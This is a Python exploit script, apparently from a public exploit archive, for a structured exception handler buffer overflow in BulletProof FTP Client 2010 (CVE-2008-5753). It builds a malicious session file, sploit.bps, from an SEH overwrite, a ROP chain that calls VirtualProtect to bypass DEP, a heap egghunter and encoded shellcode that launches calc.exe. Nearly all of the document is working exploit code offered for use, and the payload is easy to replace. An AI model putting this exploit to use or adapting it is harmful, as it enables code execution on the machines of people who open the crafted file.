#-----------------------------------------------------------------------------#
# Exploit Title: BulletProof FTP Client 2010 - Buffer Overflow (SEH)          #
# Date: Feb 15 2015                                                           #
# Exploit Author: Gabor Seljan                                                #
# Software Link: http://www.bpftp.com/                                        #
# Version: 2010.75.0.76                                                       #
# Tested on: Windows XP SP3 English                                           #
# Credits: His0k4                                                             #
# CVE: CVE-2008-5753                                                          #
#-----------------------------------------------------------------------------#

#!/usr/bin/python

from struct import pack

# offset to SEH is 93 byte
buf  = b'A' * 13
buf += pack('<L',0x77c1f62f)          # POP ECX # POP ECX # POP EDI # POP EBX # POP EBP # RETN [msvcrt.dll]
buf += b'A' * 20
buf += pack('<L',0x74c86a99)          # POP ESI # RETN [oleacc.dll]
buf += b'A' * 4
buf += pack('<L',0x77c4dca8)          # ADD ESP,2C # RETN [msvcrt.dll]
buf += b'A' * 18
buf += pack('<L',0x77c1c47f)          # POP EBX # POP EBP # RETN 10 [msvcrt.dll]
buf += b'A' * 8
buf += pack('<L',0x74c86a9a)          # RETN [oleacc.dll]
buf += b'A' * 10
buf += b'\xce\xc3\x40'                # ADD ESP,400 # POP ESI # POP EBX # RETN [bpftpclient.exe]

# ROP chain
rop_gadgets  = b''
rop_gadgets += pack('<L',0x77c364d5)  # POP EBP # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c364d5)  # skip 4 bytes [msvcrt.dll]
rop_gadgets += pack('<L',0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0xfffffafe)  # Value to negate, will become 0x00000501
rop_gadgets += pack('<L',0x7ca82222)  # NEG EAX # RETN [shell32.dll]
rop_gadgets += pack('<L',0x77227494)  # XCHG EAX,EBX # RETN [WININET.dll]
rop_gadgets += pack('<L',0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0xffffffc0)  # Value to negate, will become 0x00000040
rop_gadgets += pack('<L',0x771bcbe4)  # NEG EAX # RETN [WININET.dll]
rop_gadgets += pack('<L',0x77f124c8)  # XCHG EAX,EDX # RETN [GDI32.dll]
rop_gadgets += pack('<L',0x77c2c343)  # POP ECX # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c605b5)  # &Writable location [msvcrt.dll]
rop_gadgets += pack('<L',0x77c23b47)  # POP EDI # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c39f92)  # RETN (ROP NOP) [msvcrt.dll]
rop_gadgets += pack('<L',0x77c34d9a)  # POP ESI # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c2aacc)  # JMP [EAX] [msvcrt.dll]
rop_gadgets += pack('<L',0x77c21d16)  # POP EAX # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c11120)  # ptr to &VirtualProtect() [IAT msvcrt.dll]
rop_gadgets += pack('<L',0x77c12df9)  # PUSHAD # RETN [msvcrt.dll]
rop_gadgets += pack('<L',0x77c35524)  # ptr to 'push esp #  ret ' [msvcrt.dll]


# heap-only egghunter
hunter  = b'\x6a\x30\x5a'             # PUSH 30 # POP EDX
hunter += b'\x64\x8b\x12'             # MOV EDX, DWORD PTR FS:[EDX]
hunter += b'\x80\xc2\x90'             # ADD DL,90
hunter += b'\x8b\x12'                 # MOV EDX, DWORD PTR [EDX]
hunter += b'\x8b\x12'                 # MOV EDX, DWORD PTR [EDX]
hunter += b'\xeb\x05'                 # JMP SHORT
hunter += b'\x66\x81\xca\xff\x0f'     # OR DX,0FFF
hunter += b'\x42\x52'                 # INC EDX # PUSH EDX
hunter += b'\x6a\x02\x58'             # PUSH 2 # POP EAX
hunter += b'\xcd\x2e'                 # INT 2E
hunter += b'\x3c\x05'                 # CMP AL,5
hunter += b'\x5a'                     # POP EDX
hunter += b'\x74\xef'                 # JE SHORT
hunter += b'\xb8\x77\x30\x30\x74'     # MOV EAX, w00t
hunter += b'\x89\xd7'                 # MOV EDI,EDX
hunter += b'\xaf'                     # SCAS DWORD PTR ES:[EDI]
hunter += b'\x75\xea'                 # JNZ SHORT
hunter += b'\xaf'                     # SCAS DWORD PTR ES:[EDI]
hunter += b'\x75\xe7'                 # JNZ SHORT

# copy shellcode back to stack
strcpy  = b'\x8b\xec'                 # MOV EBP,ESP
strcpy += b'\x57\x55\x55'             # PUSH EDI # PUSH EBP # PUSH EBP
strcpy += b'\x68\x30\x60\xc4\x77'     # PUSH ptr to &strcpy [msvcrt.dll]
strcpy += b'\xc3'                     # RET

egg = 'w00t'.encode()

# msfvenom -p windows/exec -b '\x00\x0d\x0a\x1a' -e x86/shikata_ga_nai cmd=calc.exe
shellcode  = b''
shellcode += b'\xdb\xd1\xb8\xda\x92\x2c\xca\xd9\x74\x24\xf4\x5a\x31'
shellcode += b'\xc9\xb1\x31\x83\xc2\x04\x31\x42\x14\x03\x42\xce\x70'
shellcode += b'\xd9\x36\x06\xf6\x22\xc7\xd6\x97\xab\x22\xe7\x97\xc8'
shellcode += b'\x27\x57\x28\x9a\x6a\x5b\xc3\xce\x9e\xe8\xa1\xc6\x91'
shellcode += b'\x59\x0f\x31\x9f\x5a\x3c\x01\xbe\xd8\x3f\x56\x60\xe1'
shellcode += b'\x8f\xab\x61\x26\xed\x46\x33\xff\x79\xf4\xa4\x74\x37'
shellcode += b'\xc5\x4f\xc6\xd9\x4d\xb3\x9e\xd8\x7c\x62\x95\x82\x5e'
shellcode += b'\x84\x7a\xbf\xd6\x9e\x9f\xfa\xa1\x15\x6b\x70\x30\xfc'
shellcode += b'\xa2\x79\x9f\xc1\x0b\x88\xe1\x06\xab\x73\x94\x7e\xc8'
shellcode += b'\x0e\xaf\x44\xb3\xd4\x3a\x5f\x13\x9e\x9d\xbb\xa2\x73'
shellcode += b'\x7b\x4f\xa8\x38\x0f\x17\xac\xbf\xdc\x23\xc8\x34\xe3'
shellcode += b'\xe3\x59\x0e\xc0\x27\x02\xd4\x69\x71\xee\xbb\x96\x61'
shellcode += b'\x51\x63\x33\xe9\x7f\x70\x4e\xb0\x15\x87\xdc\xce\x5b'
shellcode += b'\x87\xde\xd0\xcb\xe0\xef\x5b\x84\x77\xf0\x89\xe1\x88'
shellcode += b'\xba\x90\x43\x01\x63\x41\xd6\x4c\x94\xbf\x14\x69\x17'
shellcode += b'\x4a\xe4\x8e\x07\x3f\xe1\xcb\x8f\xd3\x9b\x44\x7a\xd4'
shellcode += b'\x08\x64\xaf\xb7\xcf\xf6\x33\x16\x6a\x7f\xd1\x66'

identifier = b'This is a BulletProof FTP Client Session-File and should not be modified directly.'
host       = buf
port       = b'21'
name       = b'B' + rop_gadgets + hunter + strcpy
password   = b'bpfmcidchffddknejf'
local      = egg + egg + shellcode

sploit     = b"\r\n".join([identifier, host, port, name, password, local])

try:
  print('[*] Creating exploit file...')
  f = open('sploit.bps', 'wb')
  f.write(sploit)
  f.close()
  print('[*] sploit.bps file successfully created!')
except:
  print('[!] Error while creating exploit file!')